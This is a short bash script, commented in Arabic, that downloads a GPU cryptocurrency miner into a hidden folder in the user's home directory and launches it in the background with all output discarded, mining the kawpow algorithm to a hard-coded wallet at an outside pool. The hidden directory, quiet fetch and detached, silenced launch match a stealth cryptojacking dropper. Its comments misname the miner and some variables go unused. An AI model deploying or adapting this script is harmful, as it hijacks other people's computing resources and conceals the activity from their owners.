#!/bin/bash

# الانتقال إلى المنزل وإنشاء مجلد خفي
cd ~
mkdir -p .xna && cd .xna

# تحميل LolMiner بصمت
wget -q https://github.com/develsoftware/GMinerRelease/releases/download/3.44/gminer_3_44_linux64.tar.xz

# فك الضغط بصمت
tar -xvf gminer_3_44_linux64.tar.xz


# عنوان المحفظة (استبدله بعنوانك)
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"
WORKER="gpu_worker"
POOL="stratum+tcp://stratum-eu.rplant.xyz:7029"

# تشغيل LolMiner فقط على GPU بصمت
nohup ./miner --algo kawpow --server stratum+tcp://stratum-eu.rplant.xyz:7029 --user xna:NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT --mode mining > /dev/null 2>&1 &

